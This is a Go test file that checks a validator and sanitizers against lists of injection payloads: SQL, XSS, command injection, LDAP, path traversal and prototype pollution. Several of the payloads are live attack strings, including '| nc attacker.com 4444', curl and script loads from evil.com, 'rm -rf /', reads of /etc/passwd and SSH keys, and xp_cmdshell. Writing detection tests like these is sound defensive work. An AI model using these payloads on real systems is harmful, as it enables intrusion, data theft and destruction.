package security

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

// TestSQLInjectionAttackVectors tests various SQL injection attack vectors
func TestSQLInjectionAttackVectors(t *testing.T) {
	v := NewValidator()

	attackVectors := []string{
		// Classic SQL injection
		"admin' OR '1'='1",
		"' OR '1'='1' --",
		"admin'--",
		"' OR 1=1--",

		// Union-based injection
		"' UNION SELECT * FROM users--",
		"1' UNION SELECT NULL, username, password FROM users--",
		"' UNION ALL SELECT table_name FROM information_schema.tables--",

		// Stacked queries
		"'; DROP TABLE users; --",
		"1'; DELETE FROM users WHERE '1'='1",
		"admin'; UPDATE users SET password='hacked' WHERE username='admin'--",

		// Blind SQL injection
		"' AND 1=1--",
		"' AND 1=2--",
		"admin' AND SLEEP(5)--",
		"' OR (SELECT COUNT(*) FROM users) > 0--",

		// Time-based blind injection
		"'; WAITFOR DELAY '00:00:05'--",
		"' OR IF(1=1, SLEEP(5), 0)--",

		// Error-based injection
		"' AND 1=CONVERT(int, (SELECT @@version))--",
		"' AND 1=CAST((SELECT @@version) AS int)--",

		// Comment injection
		"admin'/*",
		"admin'#",
		"admin'--+",

		// Boolean-based injection
		"admin' AND '1'='1",
		"admin' AND '1'='2",

		// Second-order injection
		"admin''--",

		// Hex encoding attempts
		"0x61646d696e",

		// Stored procedure attacks
		"'; EXEC xp_cmdshell('dir')--",
		"'; EXEC sp_executesql N'SELECT * FROM users'--",
	}

	for _, attack := range attackVectors {
		t.Run("SQL_Injection_"+attack[:min(20, len(attack))], func(t *testing.T) {
			err := v.ValidateVar(attack, "no_sql_injection")
			assert.Error(t, err, "Should detect SQL injection: %s", attack)

			// Also test with DetectSQLInjection function
			detected := DetectSQLInjection(attack)
			assert.True(t, detected, "DetectSQLInjection should detect: %s", attack)
		})
	}
}

// TestXSSAttackVectors tests various XSS attack vectors
func TestXSSAttackVectors(t *testing.T) {
	v := NewValidator()

	attackVectors := []string{
		// Basic script injection
		"<script>alert('xss')</script>",
		"<script>alert(document.cookie)</script>",
		"<script src='http://evil.com/xss.js'></script>",

		// Event handler injection
		"<img src=x onerror=alert('xss')>",
		"<body onload=alert('xss')>",
		"<input onfocus=alert('xss') autofocus>",
		"<svg onload=alert('xss')>",
		"<marquee onstart=alert('xss')>",
		"<div onmouseover=alert('xss')>",

		// JavaScript protocol
		"javascript:alert('xss')",
		"javascript:void(document.cookie='stolen')",

		// Data protocol
		"data:text/html,<script>alert('xss')</script>",
		"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=",

		// Iframe injection
		"<iframe src='javascript:alert(1)'>",
		"<iframe src='data:text/html,<script>alert(1)</script>'>",

		// Object/Embed injection
		"<object data='javascript:alert(1)'>",
		"<embed src='javascript:alert(1)'>",

		// Style injection
		"<style>@import'http://evil.com/xss.css';</style>",
		"<link rel='stylesheet' href='javascript:alert(1)'>",

		// SVG injection
		"<svg><script>alert('xss')</script></svg>",
		"<svg/onload=alert('xss')>",

		// Math/Form injection
		"<math><mi xlink:href='javascript:alert(1)'>click</mi></math>",
		"<form action='javascript:alert(1)'><input type='submit'>",

		// Meta refresh
		"<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",

		// Image with error
		"<img src='x' onerror='alert(1)'>",

		// Encoded attacks
		"&lt;script&gt;alert('xss')&lt;/script&gt;",
		"%3Cscript%3Ealert('xss')%3C/script%3E",

		// Case variations
		"<ScRiPt>alert('xss')</ScRiPt>",
		"<SCRIPT>alert('xss')</SCRIPT>",

		// Null byte injection
		"<script\x00>alert('xss')</script>",

		// Unicode bypass attempts
		"<script\\u003e>alert('xss')</script>",
	}

	for _, attack := range attackVectors {
		t.Run("XSS_"+attack[:min(20, len(attack))], func(t *testing.T) {
			err := v.ValidateVar(attack, "no_xss")
			assert.Error(t, err, "Should detect XSS: %s", attack)
		})
	}
}

// TestCommandInjectionAttackVectors tests command injection patterns
func TestCommandInjectionAttackVectors(t *testing.T) {
	v := NewValidator()

	attackVectors := []string{
		// Basic command injection
		"; ls -la",
		"| cat /etc/passwd",
		"& whoami",
		"&& rm -rf /",
		"|| id",

		// Command substitution
		"$(whoami)",
		"`whoami`",
		"$(cat /etc/passwd)",

		// Redirect attacks
		"> /dev/null",
		">> /tmp/output",
		"< /etc/passwd",
		"2>&1",

		// Newline injection
		"\nrm -rf /",
		"\rid",
		"\r\nwhoami",

		// Piping
		"| nc attacker.com 4444",
		"| curl http://evil.com",
	}

	for _, attack := range attackVectors {
		t.Run("CMD_Injection_"+attack[:min(15, len(attack))], func(t *testing.T) {
			err := v.ValidateVar(attack, "no_command_injection")
			assert.Error(t, err, "Should detect command injection: %s", attack)
		})
	}
}

// TestLDAPInjectionAttackVectors tests LDAP injection patterns
func TestLDAPInjectionAttackVectors(t *testing.T) {
	v := NewValidator()

	attackVectors := []string{
		// LDAP filter injection
		"*)(uid=*",
		"*)(|(uid=*",
		"admin)(|(password=*",

		// Boolean operators
		"*)(uid=admin",
		"*)(|(uid=admin)(uid=user",

		// Wildcard abuse
		"*",
		"a*",
		"*a",

		// Filter bypass
		"(&(uid=admin)(password=*))",
		"(|(uid=admin)(uid=user))",
	}

	for _, attack := range attackVectors {
		t.Run("LDAP_Injection_"+attack, func(t *testing.T) {
			err := v.ValidateVar(attack, "no_ldap_injection")
			assert.Error(t, err, "Should detect LDAP injection: %s", attack)
		})
	}
}

// TestPathTraversalAttackVectors tests path traversal patterns
func TestPathTraversalAttackVectors(t *testing.T) {
	v := NewValidator()

	attackVectors := []string{
		// Basic path traversal
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32\\config\\sam",

		// URL encoded
		"..%2F..%2F..%2Fetc%2Fpasswd",
		"..%5C..%5C..%5Cwindows",

		// Double encoded
		"..%252F..%252F..%252Fetc%252Fpasswd",

		// Null byte injection
		"../../../etc/passwd\x00",

		// Unicode bypass
		"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",

		// Relative paths
		"./../../etc/passwd",
		"./../../../etc/passwd",

		// Absolute paths
		"/etc/passwd",
		"C:\\Windows\\System32",

		// Home directory
		"~/secrets",
		"~root/.ssh/id_rsa",
	}

	for _, attack := range attackVectors {
		t.Run("Path_Traversal_"+attack[:min(20, len(attack))], func(t *testing.T) {
			err := v.ValidateVar(attack, "safe_path")
			assert.Error(t, err, "Should detect path traversal: %s", attack)
		})
	}
}

// TestPrototypePollutionAttackVectors tests JavaScript prototype pollution
func TestPrototypePollutionAttackVectors(t *testing.T) {
	v := NewValidator()

	attackVectors := []string{
		// Prototype pollution
		`{"__proto__": {"admin": true}}`,
		`{"constructor": {"prototype": {"admin": true}}}`,
		`{"prototype": {"isAdmin": true}}`,

		// Function injection
		`{"func": "function() { alert('xss') }"}`,
		`{"eval": "eval('malicious')"}`,
		`{"setTimeout": "setTimeout(function(){}, 0)"}`,
		`{"setInterval": "setInterval(function(){}, 0)"}`,

		// Constructor manipulation
		`{"constructor": "alert(1)"}`,
	}

	for _, attack := range attackVectors {
		t.Run("Prototype_Pollution_"+attack[:min(30, len(attack))], func(t *testing.T) {
			err := v.ValidateVar(attack, "safe_json")
			assert.Error(t, err, "Should detect prototype pollution: %s", attack)
		})
	}
}

// TestSanitizationEffectiveness tests sanitization functions
func TestSanitizationEffectiveness(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		sanitize func(string) string
		verify   func(*testing.T, string)
	}{
		{
			name:  "HTML sanitization removes scripts",
			input: "<p>Hello</p><script>alert('xss')</script><b>World</b>",
			sanitize: func(s string) string {
				return SanitizeHTML(s)
			},
			verify: func(t *testing.T, result string) {
				assert.NotContains(t, result, "<script>")
				assert.NotContains(t, result, "alert")
			},
		},
		{
			name:  "Input sanitization removes null bytes",
			input: "Hello\x00World\x00",
			sanitize: func(s string) string {
				return SanitizeInput(s, 100)
			},
			verify: func(t *testing.T, result string) {
				assert.NotContains(t, result, "\x00")
				assert.Equal(t, "HelloWorld", result)
			},
		},
		{
			name:  "Tag sanitization removes dangerous chars",
			input: "Tag<script>Name",
			sanitize: func(s string) string {
				return SanitizeTag(s)
			},
			verify: func(t *testing.T, result string) {
				assert.NotContains(t, result, "<")
				assert.NotContains(t, result, ">")
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := tt.sanitize(tt.input)
			tt.verify(t, result)
		})
	}
}

// TestCombinedAttackVectors tests realistic combined attack scenarios
func TestCombinedAttackVectors(t *testing.T) {
	v := NewValidator()

	// Realistic attack scenarios
	scenarios := []struct {
		name   string
		input  string
		checks []string
	}{
		{
			name:   "SQL + XSS combo",
			input:  "admin' OR '1'='1'--<script>alert('xss')</script>",
			checks: []string{"no_sql_injection", "no_xss"},
		},
		{
			name:   "Path traversal + command injection",
			input:  "../../../etc/passwd; cat /etc/shadow",
			checks: []string{"safe_path", "no_command_injection"},
		},
		{
			name:   "XSS in username field",
			input:  "user<script>alert(document.cookie)</script>",
			checks: []string{"no_xss", "safe_username"},
		},
	}

	for _, scenario := range scenarios {
		t.Run(scenario.name, func(t *testing.T) {
			for _, check := range scenario.checks {
				err := v.ValidateVar(scenario.input, check)
				assert.Error(t, err, "Should fail validation check: %s", check)
			}
		})
	}
}

// Helper function
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
